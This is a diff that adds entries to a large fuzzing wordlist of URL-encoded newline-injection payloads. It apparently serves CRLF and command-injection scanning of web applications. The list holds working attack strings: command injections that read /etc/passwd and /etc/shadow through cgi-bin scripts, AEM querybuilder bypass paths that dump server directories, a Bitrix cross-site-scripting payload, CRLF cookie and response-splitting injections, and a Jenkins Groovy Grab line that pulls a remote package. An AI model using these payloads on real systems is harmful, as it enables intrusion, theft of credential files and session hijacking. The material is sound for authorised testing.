@@ -5993,6 +5993,7 @@ ${system(print(`echo%20yhcdbt%0aecho%20$((19%2b19))%0aecho%20yhcdbt%0aecho%20yhc
 %0a/bin/cat%20/etc/shadow
 %0a/usr/bin/id
 %0a/usr/bin/id%0a
+%0a/yoursite.com
 %0a;select @@version
 %0a;select @@version --
 %0a;select banner from v$version
@@ -9308,6 +9309,8 @@ ${system(print(`echo%20yhcdbt%0aecho%20$((19%2b19))%0aecho%20yhcdbt%0aecho%20yhc
 %0d%fe
 %0d%ff
 %0d.sn1persecurity.com%2f
+%0d/yoursite.com
+%0d/yoursite.com (also try %09, %00, %0a, %07)
 %0d0a.asp.aspx
 %0d0a.asp.atom
 %0d0a.asp.bat
@@ -23353,15 +23356,30 @@ _institute%0a
 admin%0a
 admin%0d
 bin.json;%0aa.css
+bin///querybuilder.feed.servlet;%0aa.css
+bin///querybuilder.json.servlet;%0aa.css
+bin///querybuilder.json;%0aa.css
+bin///wcm///search///gql.json;%0aa.css?query=type:base%20limit:..1&pathprefix=
+bin///wcm///search///gql.json;%0aa.html?query=type:base%20limit:..1&pathprefix=
+bin///wcm///search///gql.json;%0aa.ico?query=type:base%20limit:..1&pathprefix=
+bin///wcm///search///gql.json;%0aa.js?query=type:base%20limit:..1&pathprefix=
+bin///wcm///search///gql.json;%0aa.png?query=type:base%20limit:..1&pathprefix=
+bin///wcm/search/gql.json;%0aa.css
 bin/querybuilder.feed.servlet;%0aa.css
+bin/querybuilder.json.;%0aa.css?path=/etc&p.hits=full&p.limit=-1
+bin/querybuilder.json.;%0aa.css?path=/home&p.hits=full&p.limit=-1
 bin/querybuilder.json.servlet;%0aa.css
 bin/querybuilder.json;%0aa.css
+bin/querybuilder.json;%0aa.css?path=/bin
+bin/querybuilder.json;%0aa.css?path=/home
+bin/wcm/contentfinder/connector/suggestions.json;%0aojh.css?query_term=path%3a/&pre={{randstr}}
 bin/wcm/search/gql.json;%0aa.css
 bin/wcm/search/gql.json;%0aa.css?query=type:base%20limit:..1&pathprefix=
 bin/wcm/search/gql.json;%0aa.html?query=type:base%20limit:..1&pathprefix=
 bin/wcm/search/gql.json;%0aa.ico?query=type:base%20limit:..1&pathprefix=
 bin/wcm/search/gql.json;%0aa.js?query=type:base%20limit:..1&pathprefix=
 bin/wcm/search/gql.json;%0aa.png?query=type:base%20limit:..1&pathprefix=
+bitrix/components/bitrix/mobileapp.list/ajax.php/?=&ajax_call=y&items%5bitems%5d%5bbottom%5d%5bleft%5d=&items%5bitems%5d%5btogglable%5d=test123&=&items%5bitems%5d%5bid%5d=%3cimg+src=%22//%0d%0a)%3b//%22%22%3e%3cdiv%3ex%0d%0a%7d)%3bvar+bx+=+window.bx%3bwindow.bx+=+function(node,+bcache)%7b%7d%3bbx.ready+=+function(handler)%7b%7d%3bfunction+__mobileapplist(test)%7balert(document.domain)%3b%7d%3b//%3c/div%3e
 bnsto%0ary
 campas?%0acat%0a/etc/passwd%0a
 campas?%0acat%0a{knownfile}%0a
@@ -23369,6 +23387,7 @@ cgi-bin/campas?%0acat%0a/etc/passwd%0a
 cgi-bin/formmail.cgi?recipient=root@localhost%0acat%20/etc/passwd&email=joeuser@localhost&subject=test
 cgi-bin/formmail.pl?recipient=root@localhost%0acat%20/etc/passwd&email=joeuser@localhost&subject=test
 cgi-bin/formmail?recipient=root@localhost%0acat%20/etc/passwd&email=joeuser@localhost&subject=test
+cgi-bin/kerbynet?action=startsessionsubmit&user='%0acat%20/etc/passwd%0a'&pw=
 cgi-bin/ncommerce3/execmacro/macro.d2w/%0a%0a
 cgi-bin/pfdispaly.cgi?'%0a/bin/cat%20/etc/passwd|'
 cgi-bin/pfdisplay.cgi?'%0a/bin/cat%20/etc/passwd|'
@@ -23540,6 +23559,7 @@ phf.cgi?qalias=x%0a/bin/cat%20/etc/passwd
 phf?qname=root%0acat%20/etc/passwd%20
 phf?qname=root%0acat%20{knownfile}%20
 phpmyadmin/%0d
+plugins/captcha/crypt/cryptographp.php?cfg=1%0d%0aset-cookie:%20crlfinjection=1
 prespawnlocation::invalidurlerror
 print(`echo%20dbcnno%0aecho%20$((39%2b97))%0aecho%20dbcnno%0aecho%20dbcnno`)%3b.%252522dbcnno
 print(`echo%20okejjb%0aecho%20$((46%2b60))%0aecho%20okejjb%0aecho%20okejjb`)%3bokejjb
@@ -23554,7 +23574,9 @@ r%0d%0acontentlength:%200%0d%0a%0d%0ahttp/1.1%20200%20ok%0d%0acontenttype:%20tex
 redir.exe?url=http%3a%2f%2fwww%2egoogle%2ecom%2f%0d%0a%0d%0a%3c
 redir.exe?url=http%3a%2f%2fwww%2egoogle%2ecom%2f%0d%0a%0d%0a%3cscript%3ealert%28%27vulnerable%27%29%3c%2fscript%3e
 scripts/*%0a.pl
+securityrealm/user/admin/descriptorbyname/org.jenkinsci.plugins.workflow.cps.cpsflowdefinition/checkscriptcompile?value=@grabconfig(disablechecksums=true)%0a@grabresolver(name=%27test%27,%20root=%27http://aaa%27)%0a@grab(group=%27package%27,%20module=%27vulntest%27,%20version=%271%27)%0aimport%20payload;
 string.raw`javascript:/*-/*`/*\`/*'/*"/**/(/* */onclick=alert() )//%0d%0a%0d%0a//</style/</title/</textarea/</script/--!>\x3csvg/<svg/onload=alert()//>\x3e`;
+system///sling/loginstatus.json;%0aa.css
 system/bgservlets/test.json;%0aa.css
 system/sling/loginstatus.json;%0aa.css
 url-redirect vuln == xss ! location:data:text/html,<svg/onload=alert(document.domain)> #opera @jackmasa
@@ -23569,4 +23591,5 @@ var str = 'javascript:/*-/*`/*\`/*'/*"/**/(/* */onclick=alert() )//%0d%0a%0d%0a/
 whois_raw.cgi?fqdn=%0acat%20/etc/passwd
 whois_raw.cgi?fqdn=%0acat%20{knownfile}
 wiki/%d9%88%d9%8a%d9%83%d9%8a_%d9%be%d8%af%d9%8a%d8%a7%3a%d9%86%d8%b8%d8%b1%d8%ae%d9%88%d8%a7%d9%87%d9%8a%0a
+wp-content/plugins/ck-offers/assets/css/%22data:image/svg+xml,%0a%3csvg%20width='9px'%20height='6px'%20viewbox='0%200%209%206'%20version='1.1'%20xmlns='http:/www.w3.org/2000/svg'%20xmlns:xlink='http:/www.w3.org/1999/xlink'%3e%3cg%20id='v1'%20stroke='none'%20stroke-width='1'%20fill='none'%20fill-rule='evenodd'%3e%3cg%20id='mobile_collapsed'%20transform='translate(-229.000000,%20-912.000000
 zazzle%0d%0a
